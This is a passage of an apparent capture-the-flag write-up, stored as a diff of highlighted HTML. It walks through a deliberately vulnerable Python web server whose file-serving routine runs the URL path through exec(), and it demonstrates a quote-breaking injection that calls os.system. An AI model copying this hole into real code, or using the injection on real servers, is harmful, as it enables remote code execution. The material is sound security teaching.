+        <span class="n">req</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="nf">strip</span><span class="p">(</span><span class="sh">"</span><span class="se">\r</span><span class="sh">"</span><span class="p">).</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">method</span><span class="p">,</span><span class="n">doc</span><span class="p">,</span><span class="n">vers</span> <span class="o">=</span> <span class="n">req</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s"> </span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">header</span> <span class="o">=</span> <span class="n">req</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span>
+        <span class="n">body</span> <span class="o">=</span> <span class="n">req</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+        <span class="n">headerDict</span> <span class="o">=</span> <span class="p">{}</span>
+        <span class="k">for</span> <span class="n">param</span> <span class="ow">in</span> <span class="n">header</span><span class="p">:</span>
+            <span class="n">pos</span> <span class="o">=</span> <span class="n">param</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">: </span><span class="sh">"</span><span class="p">)</span>
+            <span class="n">key</span><span class="p">,</span> <span class="n">val</span> <span class="o">=</span> <span class="n">param</span><span class="p">[:</span><span class="n">pos</span><span class="p">],</span> <span class="n">param</span><span class="p">[</span><span class="n">pos</span><span class="o">+</span><span class="mi">2</span><span class="p">:]</span>
+            <span class="n">headerDict</span><span class="p">.</span><span class="nf">update</span><span class="p">({</span><span class="n">key</span><span class="p">:</span> <span class="n">val</span><span class="p">})</span>
+        <span class="k">return</span> <span class="p">{</span><span class="sh">"</span><span class="s">method</span><span class="sh">"</span><span class="p">:</span> <span class="n">method</span><span class="p">,</span> <span class="sh">"</span><span class="s">doc</span><span class="sh">"</span><span class="p">:</span> <span class="n">doc</span><span class="p">,</span> <span class="sh">"</span><span class="s">vers</span><span class="sh">"</span><span class="p">:</span> <span class="n">vers</span><span class="p">,</span> <span class="sh">"</span><span class="s">header</span><span class="sh">"</span><span class="p">:</span> <span class="n">headerDict</span><span class="p">,</span> <span class="sh">"</span><span class="s">body</span><span class="sh">"</span><span class="p">:</span> <span class="n">body</span><span class="p">}</span>
+
+
+<span class="k">class</span> <span class="nc">Server</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>    
+        <span class="n">self</span><span class="p">.</span><span class="n">host</span> <span class="o">=</span> <span class="n">host</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">port</span> <span class="o">=</span> <span class="n">port</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">sock</span><span class="p">.</span><span class="nf">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">sock</span><span class="p">.</span><span class="nf">bind</span><span class="p">((</span><span class="n">self</span><span class="p">.</span><span class="n">host</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">port</span><span class="p">))</span>
+
+    <span class="k">def</span> <span class="nf">listen</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">sock</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+            <span class="n">client</span><span class="p">,</span> <span class="n">address</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">sock</span><span class="p">.</span><span class="nf">accept</span><span class="p">()</span>
+            <span class="n">client</span><span class="p">.</span><span class="nf">settimeout</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span>
+            <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">listenToClient</span><span class="p">,</span><span class="n">args</span> <span class="o">=</span> <span class="p">(</span><span class="n">client</span><span class="p">,</span><span class="n">address</span><span class="p">)).</span><span class="nf">start</span><span class="p">()</span>
+
+    <span class="k">def</span> <span class="nf">listenToClient</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">client</span><span class="p">,</span> <span class="n">address</span><span class="p">):</span>
+        <span class="n">size</span> <span class="o">=</span> <span class="mi">1024</span>
+        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">client</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
+                <span class="k">if</span> <span class="n">data</span><span class="p">:</span>
+                    <span class="c1"># Set the response to echo back the received data 
+</span>                    <span class="n">req</span> <span class="o">=</span> <span class="nc">Request</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">decode</span><span class="p">())</span>
+                    <span class="n">self</span><span class="p">.</span><span class="nf">handleRequest</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">client</span><span class="p">,</span> <span class="n">address</span><span class="p">)</span>
+                    <span class="n">client</span><span class="p">.</span><span class="nf">shutdown</span><span class="p">()</span>
+                    <span class="n">client</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="k">raise</span> <span class="nf">error</span><span class="p">(</span><span class="sh">'</span><span class="s">Client disconnected</span><span class="sh">'</span><span class="p">)</span>
+            <span class="k">except</span><span class="p">:</span>
+                <span class="n">client</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+                <span class="k">return</span> <span class="bp">False</span>
+    
+    <span class="k">def</span> <span class="nf">handleRequest</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">conn</span><span class="p">,</span> <span class="n">address</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">good</span><span class="p">:</span>
+<span class="c1">#            try:
+</span>                <span class="c1"># print(str(request.method) + " " + str(request.doc), end=' ')
+</span>                <span class="c1"># print("from {0}".format(address[0]))
+#            except Exception as e:
+#                print(e)
+</span>            <span class="n">document</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">serveDoc</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">doc</span><span class="p">,</span> <span class="n">DOC_ROOT</span><span class="p">)</span>
+            <span class="n">statusNum</span><span class="o">=</span><span class="n">document</span><span class="p">[</span><span class="sh">"</span><span class="s">status</span><span class="sh">"</span><span class="p">]</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">document</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">serveDoc</span><span class="p">(</span><span class="sh">"</span><span class="s">/errors/400.html</span><span class="sh">"</span><span class="p">,</span> <span class="n">DOC_ROOT</span><span class="p">)</span>
+            <span class="n">statusNum</span><span class="o">=</span><span class="sh">"</span><span class="s">400</span><span class="sh">"</span>
+        <span class="n">body</span> <span class="o">=</span> <span class="n">document</span><span class="p">[</span><span class="sh">"</span><span class="s">body</span><span class="sh">"</span><span class="p">]</span>
+        
+        <span class="n">statusCode</span><span class="o">=</span><span class="n">CODES</span><span class="p">[</span><span class="n">statusNum</span><span class="p">]</span>
+        <span class="n">dateSent</span> <span class="o">=</span> <span class="sh">""</span>
+        <span class="n">server</span> <span class="o">=</span> <span class="sh">"</span><span class="s">BadHTTPServer</span><span class="sh">"</span>
+        <span class="n">modified</span> <span class="o">=</span> <span class="sh">""</span>
+        <span class="n">length</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">body</span><span class="p">)</span>
+        <span class="n">contentType</span> <span class="o">=</span> <span class="n">document</span><span class="p">[</span><span class="sh">"</span><span class="s">mime</span><span class="sh">"</span><span class="p">]</span> <span class="c1"># Try and identify MIME type from string
+</span>        <span class="n">connectionType</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Closed</span><span class="sh">"</span>
+
+
+        <span class="n">resp</span> <span class="o">=</span> <span class="nc">Response</span><span class="p">(</span>
+        <span class="n">statusNum</span><span class="o">=</span><span class="n">statusNum</span><span class="p">,</span> <span class="n">statusCode</span><span class="o">=</span><span class="n">statusCode</span><span class="p">,</span> 
+        <span class="n">dateSent</span> <span class="o">=</span> <span class="n">dateSent</span><span class="p">,</span> <span class="n">server</span> <span class="o">=</span> <span class="n">server</span><span class="p">,</span> 
+        <span class="n">modified</span> <span class="o">=</span> <span class="n">modified</span><span class="p">,</span> <span class="n">length</span> <span class="o">=</span> <span class="n">length</span><span class="p">,</span> 
+        <span class="n">contentType</span> <span class="o">=</span> <span class="n">contentType</span><span class="p">,</span> <span class="n">connectionType</span> <span class="o">=</span> <span class="n">connectionType</span><span class="p">,</span> 
+        <span class="n">body</span> <span class="o">=</span> <span class="n">body</span>
+        <span class="p">)</span>
+
+        <span class="n">data</span> <span class="o">=</span> <span class="n">resp</span><span class="p">.</span><span class="nf">stringResponse</span><span class="p">()</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span>
+            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span>
+        <span class="n">conn</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">encode</span><span class="p">())</span>
+        <span class="k">return</span> <span class="mi">0</span>
+
+    <span class="k">def</span> <span class="nf">serveDoc</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">docRoot</span><span class="p">):</span>
+        <span class="n">path</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="nf">unquote</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">info</span> <span class="o">=</span> <span class="sh">"</span><span class="s">output = </span><span class="sh">'</span><span class="s">Document: {}</span><span class="sh">'"</span> <span class="c1"># Keep the output for later debug
+</span>            <span class="nf">exec</span><span class="p">(</span><span class="n">info</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">path</span><span class="p">))</span> <span class="c1"># This is how you do string formatting, right?
+</span>            <span class="n">cwd</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">dirname</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">realpath</span><span class="p">(</span><span class="n">__file__</span><span class="p">))</span>
+            <span class="n">docRoot</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">cwd</span><span class="p">,</span> <span class="n">docRoot</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">path</span> <span class="o">==</span> <span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="p">:</span>
+                <span class="n">path</span> <span class="o">=</span> <span class="sh">"</span><span class="s">/index.html</span><span class="sh">"</span>
+            <span class="n">requested</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">docRoot</span><span class="p">,</span> <span class="n">path</span><span class="p">[</span><span class="mi">1</span><span class="p">:])</span>
+            <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">isfile</span><span class="p">(</span><span class="n">requested</span><span class="p">):</span>
+                <span class="n">mime</span> <span class="o">=</span> <span class="n">mimetypes</span><span class="p">.</span><span class="nf">guess_type</span><span class="p">(</span><span class="n">requested</span><span class="p">)</span>
+                <span class="n">mime</span> <span class="o">=</span> <span class="p">(</span><span class="n">mime</span> <span class="k">if</span> <span class="n">mime</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="bp">None</span> <span class="k">else</span> <span class="sh">"</span><span class="s">text/html</span><span class="sh">"</span><span class="p">)</span>
+                <span class="n">mime</span> <span class="o">=</span> <span class="n">MIMES</span><span class="p">[</span><span class="n">requested</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">.</span><span class="sh">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]]</span>
+                <span class="k">try</span><span class="p">:</span>
+                    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">requested</span><span class="p">,</span> <span class="sh">"</span><span class="s">r</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+                        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
+                <span class="k">except</span><span class="p">:</span>
+                    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">requested</span><span class="p">,</span> <span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+                        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
+                <span class="n">status</span> <span class="o">=</span> <span class="sh">"</span><span class="s">200</span><span class="sh">"</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">errorPage</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">docRoot</span><span class="p">,</span> <span class="sh">"</span><span class="s">errors</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">404.html</span><span class="sh">"</span><span class="p">)</span>
+                <span class="n">mime</span> <span class="o">=</span> <span class="sh">"</span><span class="s">text/html</span><span class="sh">"</span>
+                <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">errorPage</span><span class="p">,</span> <span class="sh">"</span><span class="s">r</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+                    <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">().</span><span class="nf">format</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+                <span class="n">status</span> <span class="o">=</span> <span class="sh">"</span><span class="s">404</span><span class="sh">"</span>
+        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="nf">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+            <span class="n">errorPage</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">docRoot</span><span class="p">,</span> <span class="sh">"</span><span class="s">errors</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">500.html</span><span class="sh">"</span><span class="p">)</span>
+            <span class="n">mime</span> <span class="o">=</span> <span class="sh">"</span><span class="s">text/html</span><span class="sh">"</span>
+            <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">errorPage</span><span class="p">,</span> <span class="sh">"</span><span class="s">r</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
+            <span class="n">status</span> <span class="o">=</span> <span class="sh">"</span><span class="s">500</span><span class="sh">"</span>
+        <span class="k">return</span> <span class="p">{</span><span class="sh">"</span><span class="s">body</span><span class="sh">"</span><span class="p">:</span> <span class="n">data</span><span class="p">,</span> <span class="sh">"</span><span class="s">mime</span><span class="sh">"</span><span class="p">:</span> <span class="n">mime</span><span class="p">,</span> <span class="sh">"</span><span class="s">status</span><span class="sh">"</span><span class="p">:</span> <span class="n">status</span><span class="p">}</span>
+</code></pre></div></div>
+<p>In a quick scan over the code, the first thing that jumped out to me was the <code class="language-plaintext highlighter-rouge">exec</code> (with a comment that also highlights it):</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">serveDoc</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">docRoot</span><span class="p">):</span>
+    <span class="n">path</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="nf">unquote</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">info</span> <span class="o">=</span> <span class="sh">"</span><span class="s">output = </span><span class="sh">'</span><span class="s">Document: {}</span><span class="sh">'"</span> <span class="c1"># Keep the output for later debug
+</span>        <span class="nf">exec</span><span class="p">(</span><span class="n">info</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">path</span><span class="p">))</span> <span class="c1"># This is how you do string formatting, right?
+</span>        <span class="n">cwd</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">dirname</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">realpath</span><span class="p">(</span><span class="n">__file__</span><span class="p">))</span>
+</code></pre></div></div>
+<p>No, that is not how you do string formatting. Passing user input (<code class="language-plaintext highlighter-rouge">path</code>) into <code class="language-plaintext highlighter-rouge">exec</code> is always dangerous. I’ll trace back through the code to see if I can control <code class="language-plaintext highlighter-rouge">path</code> when it gets into <code class="language-plaintext highlighter-rouge">serveDoc</code>.</p>
+<p><code class="language-plaintext highlighter-rouge">serveDoc</code> is called from <code class="language-plaintext highlighter-rouge">handleRequest</code>:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">handleRequest</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">conn</span><span class="p">,</span> <span class="n">address</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">good</span><span class="p">:</span>
+        <span class="n">document</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">serveDoc</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">doc</span><span class="p">,</span> <span class="n">DOC_ROOT</span><span class="p">)</span>
+        <span class="n">statusNum</span><span class="o">=</span><span class="n">document</span><span class="p">[</span><span class="sh">"</span><span class="s">status</span><span class="sh">"</span><span class="p">]</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">document</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">serveDoc</span><span class="p">(</span><span class="sh">"</span><span class="s">/errors/400.html</span><span class="sh">"</span><span class="p">,</span> <span class="n">DOC_ROOT</span><span class="p">)</span>
+        <span class="n">statusNum</span><span class="o">=</span><span class="sh">"</span><span class="s">400</span><span class="sh">"</span>
+    <span class="n">body</span> <span class="o">=</span> <span class="n">document</span><span class="p">[</span><span class="sh">"</span><span class="s">body</span><span class="sh">"</span><span class="p">]</span>
+</code></pre></div></div>
+<p>It’s important that <code class="language-plaintext highlighter-rouge">request.good</code> is true, or else I lose control over <code class="language-plaintext highlighter-rouge">path</code> as it’s hardcoded to <code class="language-plaintext highlighter-rouge">"/errors/400.html"</code>.</p>
+<p><code class="language-plaintext highlighter-rouge">handleRequest</code> is called from <code class="language-plaintext highlighter-rouge">listenToClient</code>:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">listenToClient</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">client</span><span class="p">,</span> <span class="n">address</span><span class="p">):</span>
+    <span class="n">size</span> <span class="o">=</span> <span class="mi">1024</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="n">client</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">data</span><span class="p">:</span>
+                <span class="c1"># Set the response to echo back the received data 
+</span>                <span class="n">req</span> <span class="o">=</span> <span class="nc">Request</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">decode</span><span class="p">())</span>
+                <span class="n">self</span><span class="p">.</span><span class="nf">handleRequest</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">client</span><span class="p">,</span> <span class="n">address</span><span class="p">)</span>
+                <span class="n">client</span><span class="p">.</span><span class="nf">shutdown</span><span class="p">()</span>
+                <span class="n">client</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="k">raise</span> <span class="nf">error</span><span class="p">(</span><span class="sh">'</span><span class="s">Client disconnected</span><span class="sh">'</span><span class="p">)</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="n">client</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+            <span class="k">return</span> <span class="bp">False</span>
+</code></pre></div></div>
+<p>This is an infinite loop that recveives data, processes is into a <code class="language-plaintext highlighter-rouge">Request</code> object, and calls <code class="language-plaintext highlighter-rouge">handleRequest</code>. Tracing backwards, I need that <code class="language-plaintext highlighter-rouge">Request</code> object to have <code class="language-plaintext highlighter-rouge">.good</code> be true, and <code class="language-plaintext highlighter-rouge">.doc</code> be my code.</p>
+<p>The <code class="language-plaintext highlighter-rouge">Request</code> class converts data into the object in <code class="language-plaintext highlighter-rouge">__init__</code>:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">Request</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">request</span><span class="p">):</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">good</span> <span class="o">=</span> <span class="bp">True</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">request</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">parseRequest</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
+            <span class="n">self</span><span class="p">.</span><span class="n">method</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="sh">"</span><span class="s">method</span><span class="sh">"</span><span class="p">]</span>
+            <span class="n">self</span><span class="p">.</span><span class="n">doc</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="sh">"</span><span class="s">doc</span><span class="sh">"</span><span class="p">]</span>
+            <span class="n">self</span><span class="p">.</span><span class="n">vers</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="sh">"</span><span class="s">vers</span><span class="sh">"</span><span class="p">]</span>
+            <span class="n">self</span><span class="p">.</span><span class="n">header</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="sh">"</span><span class="s">header</span><span class="sh">"</span><span class="p">]</span>
+            <span class="n">self</span><span class="p">.</span><span class="n">body</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="sh">"</span><span class="s">body</span><span class="sh">"</span><span class="p">]</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="n">self</span><span class="p">.</span><span class="n">good</span> <span class="o">=</span> <span class="bp">False</span>
+
+    <span class="k">def</span> <span class="nf">parseRequest</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">request</span><span class="p">):</span>
+        <span class="n">req</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="nf">strip</span><span class="p">(</span><span class="sh">"</span><span class="se">\r</span><span class="sh">"</span><span class="p">).</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">method</span><span class="p">,</span><span class="n">doc</span><span class="p">,</span><span class="n">vers</span> <span class="o">=</span> <span class="n">req</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s"> </span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">header</span> <span class="o">=</span> <span class="n">req</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span>
+        <span class="n">body</span> <span class="o">=</span> <span class="n">req</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+        <span class="n">headerDict</span> <span class="o">=</span> <span class="p">{}</span>
+        <span class="k">for</span> <span class="n">param</span> <span class="ow">in</span> <span class="n">header</span><span class="p">:</span>
+            <span class="n">pos</span> <span class="o">=</span> <span class="n">param</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">: </span><span class="sh">"</span><span class="p">)</span>
+            <span class="n">key</span><span class="p">,</span> <span class="n">val</span> <span class="o">=</span> <span class="n">param</span><span class="p">[:</span><span class="n">pos</span><span class="p">],</span> <span class="n">param</span><span class="p">[</span><span class="n">pos</span><span class="o">+</span><span class="mi">2</span><span class="p">:]</span>
+            <span class="n">headerDict</span><span class="p">.</span><span class="nf">update</span><span class="p">({</span><span class="n">key</span><span class="p">:</span> <span class="n">val</span><span class="p">})</span>
+        <span class="k">return</span> <span class="p">{</span><span class="sh">"</span><span class="s">method</span><span class="sh">"</span><span class="p">:</span> <span class="n">method</span><span class="p">,</span> <span class="sh">"</span><span class="s">doc</span><span class="sh">"</span><span class="p">:</span> <span class="n">doc</span><span class="p">,</span> <span class="sh">"</span><span class="s">vers</span><span class="sh">"</span><span class="p">:</span> <span class="n">vers</span><span class="p">,</span> <span class="sh">"</span><span class="s">header</span><span class="sh">"</span><span class="p">:</span> <span class="n">headerDict</span><span class="p">,</span> <span class="sh">"</span><span class="s">body</span><span class="sh">"</span><span class="p">:</span> <span class="n">body</span><span class="p">}</span>
+</code></pre></div></div>
+<p>It seems as long as the data has a normal format with a url, version, headers, and body (can be empty), it will return <code class="language-plaintext highlighter-rouge">self.good = True</code>. Further, the <code class="language-plaintext highlighter-rouge">doc</code> is just what’s in the url string. I should be able to control that.</p>
+<h3 id="injection">Injection</h3>
+<h4 id="in-terminal">In Terminal</h4>
+<p>I’ll start with local testing that resembles what’s going on on Obscurity to see what I need to send as a payload to get execution.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">root@kali# python3
+Python 3.7.5 (default, Oct 27 2019, 15:43:29) 
+[GCC 9.2.1 20191022] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="kn">import</span> <span class="n">os</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">info</span> <span class="o">=</span> <span class="sh">"</span><span class="s">output = </span><span class="sh">'</span><span class="s">Document: {}</span><span class="sh">'"</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">path</span> <span class="o">=</span> <span class="sh">"</span><span class="s">/index.html</span><span class="sh">"</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="nf">exec</span><span class="p">(</span><span class="n">info</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">path</span><span class="p">))</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">output</span>
+<span class="go">'Document: /index.html'
+</span></code></pre></div></div>
+<p>I can see my input is added to the <code class="language-plaintext highlighter-rouge">info</code> string, and then that string is executed. The intended behavior is to save a string with the file name in the variable <code class="language-plaintext highlighter-rouge">output</code>. But what if I use the input to inject commands. If I request <code class="language-plaintext highlighter-rouge">/index.html'; os.system('echo test');'</code>, then <code class="language-plaintext highlighter-rouge">test</code> is printed:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">path</span> <span class="o">=</span> <span class="sh">"</span><span class="s">/index.html</span><span class="sh">'</span><span class="s">; os.system(</span><span class="sh">'</span><span class="s">echo test</span><span class="sh">'</span><span class="s">);</span><span class="sh">'"</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="nf">exec</span><span class="p">(</span><span class="n">info</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">path</span><span class="p">))</span>
+<span class="go">test
+</span></code></pre></div></div>
+<p>That’s because first the <code class="language-plaintext highlighter-rouge">format</code> happens, resulting in a string:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">info</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+<span class="go">"output = 'Document: /index.html'; os.system('echo test');''"
+</span></code></pre></div></div>
+<p>Now when <code class="language-plaintext highlighter-rouge">exec</code> is called on that string, it saves <code class="language-plaintext highlighter-rouge">output</code>, but also makes the <code class="language-plaintext highlighter-rouge">os.system</code> call.</p>
